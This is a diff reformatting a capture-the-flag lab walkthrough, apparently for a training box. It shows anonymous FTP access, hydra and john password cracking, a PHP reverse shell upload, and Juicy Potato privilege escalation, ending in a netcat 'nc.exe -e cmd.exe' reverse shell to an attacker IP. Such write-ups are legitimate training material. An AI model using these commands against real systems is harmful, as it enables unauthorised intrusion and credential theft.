@@ -18,12 +18,13 @@ Exploit the target through Anonymous FTP, deducing the admin credentials to gain
 
 ---
 
-# Summary
+## Summary
 
 This lab involves exploiting an anonymous FTP server to gain initial access. Learners will enumerate the target to discover credentials for an admin FTP account, then upload a malicious PHP reverse shell for remote execution. The final step involves using the Task Scheduler Privilege Escalation exploit to gain administrative access on the target. This lab focuses on enumeration, credential discovery, web shell deployment, and privilege escalation.
 
 ---
-# Learning Objectives
+
+## Learning Objectives
 
 **After completion of this lab, learners will be able to:**
 
@@ -34,9 +35,11 @@ This lab involves exploiting an anonymous FTP server to gain initial access. Lea
 - Exploit the Task Scheduler Privilege Escalation vulnerability to achieve administrative access.
 
 ---
-# Recon
+
+## Recon
 
 - NMap Scan
+
 ```bash
 nmap -p- --min-rate 10000  -sS -sV -sS -A 192.168.55.46
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 12:20 UTC
@@ -97,9 +100,12 @@ Nmap done: 1 IP address (1 host up) scanned in 39.24 seconds
 ```
 
 ---
-# Port 21 Exploitation
+
+## Port 21 Exploitation
+
 - Port 21 is for zFTPServer 6.0.
 - NMap shows it is vulnerable to Anonymous login.
+
 ```bash
 ftp 192.168.55.46
 Connected to 192.168.55.46.
@@ -112,9 +118,13 @@ Remote system type is UNIX.
 Using binary mode to transfer files.
 ftp>
 ```
+
 ---
-# Information Gathering form ftp connection
+
+## Information Gathering form ftp connection
+
 - If we check inside **accounts** folder we get two usernames inside it.
+
 ```bash
 ftp> ls accounts
 229 Entering Extended Passive Mode (|||2050|)
@@ -129,12 +139,17 @@ dr-xr-xr-x   1 root     root          512 Aug 02  2024 backup
 ```
 
 ---
-# Bruteforcing ftp with extra usernames
+
+## Bruteforcing ftp with extra usernames
+
 - Saving two usernames inside users.txt
+
 ```bash
 echo "Offsec\nadmin" >users.txt 
 ```
+
 - Using hydra to bruteforce ftp
+
 ```bash
 hydra -L users.txt -P /usr/share/wordlists/rockyou.txt.gz ftp://192.168.55.46 -u
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -144,10 +159,15 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-17 14:22:
 [DATA] attacking ftp://192.168.55.46:21/
 [21][ftp] host: 192.168.55.46   login: admin   password: admin
 ```
+
 - We got valid credential for user **admin**. It is **admin:admin**.
+
 ---
-# Validating ftp credentials
+
+## Validating ftp credentials
+
 - Using brute-forced Credential
+
 ```bash
 ftp admin@192.168.55.46
 Connected to 192.168.55.46.
@@ -159,9 +179,13 @@ Remote system type is UNIX.
 Using binary mode to transfer files.
 ftp>
 ```
+
 ---
-# Information Gathering admin ftp
+
+## Information Gathering admin ftp
+
 - There are **.htpasswd** file with encrypted password.
+
 ```bash
 ftp> ls
 229 Entering Extended Passive Mode (|||2053|)
@@ -174,9 +198,13 @@ total 3
 ftp> less .htpasswd
 offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0
 ```
+
 ---
-# Decryption of the password using john
+
+## Decryption of the password using john
+
 - Downloaded the **.htpasswd** file
+
 ```bash
 ftp> get .htpasswd
 local: .htpasswd remote: .htpasswd
@@ -187,11 +215,15 @@ local: .htpasswd remote: .htpasswd
 45 bytes received in 00:00 (1.07 KiB/s)
 ftp> 
 ```
+
 - Change file name
+
 ```bash
 mv .htpasswd offsec.txt
 ```
+
 - Bruteforced with john.
+
 ```bash
 john --wordlist=rockyou.txt offsec.txt
 Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
@@ -206,18 +238,24 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
                 
 ```
+
 - Cracked credential is **offsec:elite**.
+
 ---
-# Initial Access
+
+## Initial Access
 
 - As we have server access with **admin:admin** credentials, we can upload our shell using ftp.
 - Downloaded php reverse shell for windows and modified ip port. eg. https://github.com/ZishanAdThandar/pentest/tree/main/shell
 - Started netcat listener
+
 ```bash
 nc -lvnp 1337
 listening on [any] 1337
 ```
+
 - Upload the shell using ftp server as admin user.
+
 ```bash
 ftp admin@192.168.55.46
 Connected to 192.168.55.46.
@@ -237,12 +275,16 @@ local: hack.php remote: hack.php
 ftp> 
 
 ```
+
 - Port 242 is hosting the server with cracked credential **offsec:elite**.
 - So, we can curl the shell with authentication details to get reverse shell
+
 ```bash
 curl -u 'offsec:elite' -X GET http://192.168.55.46:242/hack.php
 ```
+
 - We will get reverse shell in our netcat listener.
+
 ```bash
 nc -lvnp 1337
 listening on [any] 1337 ...
@@ -266,9 +308,13 @@ whoami
 livda\apache
 
 ```
+
 ---
-# User Flag Extraction local.txt
+
+## User Flag Extraction local.txt
+
 - Now we can just navigate to **C:\Users\apache\Desktop** and read the flag inside **local.txt** file.
+
 ```bash
 C:\Users\apache\Desktop>dir
 dir
@@ -288,10 +334,12 @@ type local.txt
 9cd1c822f2********d8c8d30b8e0
 ```
 
-
 ---
-# Privilege Escalation
+
+## Privilege Escalation
+
 - Checking for user privilege shows **SeImpersonatePrivilege** is enabled.
+
 ```bash
 C:\wamp\bin\apache\Apache2.2.21>whoami /priv
 whoami /priv
@@ -315,10 +363,12 @@ These tools abuse Windows COM or named pipe impersonation mechanisms to escalate
 
 - Tried to the juice potato exploit. But, **failed** because the system is x86.
 - So, downloaded x86 version of juice potato on the server.
+
 ```powershell
 (New-Object System.Net.WebClient).DownloadFile("https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe", "jp.exe")
 ```
 - Extracted CLSID to use in Juicy Potato Exploit using command below
+
 ```powershell
 for /f "tokens=*" %A in ('reg query HKCR\CLSID 2^>nul') do @for /f "tokens=3" %B in ('reg query "%A" /v AppID 2^>nul ^| find /i "AppID"') do @for /f "tokens=3" %C in ('reg query HKCR\AppID\%B /v LocalService 2^>nul ^| find /i "LocalService"') do @echo CLSID: %A ^| AppID: %B ^| LocalService: %C
 ```
@@ -338,9 +388,13 @@ type C:\Users\Public\whoami.txt
 nt authority\system
 
 ```
+
 ---
-# Root Flag Extraction proof.txt
+
+## Root Flag Extraction proof.txt
+
 - Now we can just navigate to **C:\Users\apache\Desktop** and read the flag inside **local.txt** file.
+
 ```bash
 C:\Users\apache\Desktop>jp.exe -l 1337 -p "C:\Windows\System32\cmd.exe" -a "type C:\Users\Administrator\Desktop\proof.txt > C:\Users\Public\proof.txt" -t * -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
 jp.exe -l 1337 -p "C:\Windows\System32\cmd.exe" -a "type C:\Users\Administrator\Desktop\proof.txt > C:\Users\Public\proof.txt" -t * -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
@@ -363,15 +417,19 @@ cddd3973c71*****3710219e36f
 
 ---
 ---
-# Beyond root
+
+## Beyond root
+
 - Getting Administrator shell
 - Upload netcat using python server. https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc.exe
 - Start a netcat listner on any port
 - Then run huicy potato command to get shell 
+
 ```bash
 jp.exe -l 1337 -p "C:\Windows\System32\cmd.exe" -a "/c C:\Users\apache\Desktop\nc.exe -e cmd.exe 192.168.49.55 9999" -t * -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
 ```
 - Will get a Administrator shell
+
 ```bash
 nc -lvnp 9999
 listening on [any] 9999 ...
